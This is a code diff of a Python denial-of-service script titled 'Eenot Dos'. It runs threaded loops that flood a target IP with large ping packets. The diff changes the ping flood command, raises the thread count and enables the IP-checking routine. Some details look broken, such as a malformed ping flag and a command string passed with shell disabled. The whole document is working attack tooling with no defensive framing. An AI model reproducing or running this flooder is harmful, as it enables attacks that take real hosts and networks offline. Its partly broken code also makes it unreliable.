@@ -6,7 +6,10 @@ import subprocess as sub
 import threading,sys
 def DosP():    
     while True:
-        sub.run(command,shell=True,check=False)
+        try:
+            sub.run(command,shell=False,check=False)
+        except:
+            continue
         
 def Dos(ip,port):
     while True:
@@ -29,12 +32,13 @@ def Dos(ip,port):
     
 
 def CheckIps(port):
-    n = 8
+    n = 500
     
     e = []
     t = []
     print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Eenot Dos~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nDon`t use -p func, standart dos better")
     if port == 'a':
+        n = 10
         for i in range(n+1):
             e.append(threading.Event())
         for i in range(n):
@@ -81,9 +85,9 @@ try:
     if sys.argv[1] == '-p':
         IP = sys.argv[2]
         #print('OK')
-        command = 'sudo ping -i 0 -c 1 -s 60000 -t 128 '+IP
+        command = 'ping -n 1 -l/ 65500 '+IP
         #print('OK')
-        #CheckIps('a')
+        CheckIps('a')
     else:
         print('invalid argument')
         print('Usage: -p(optional) ip(optional)')
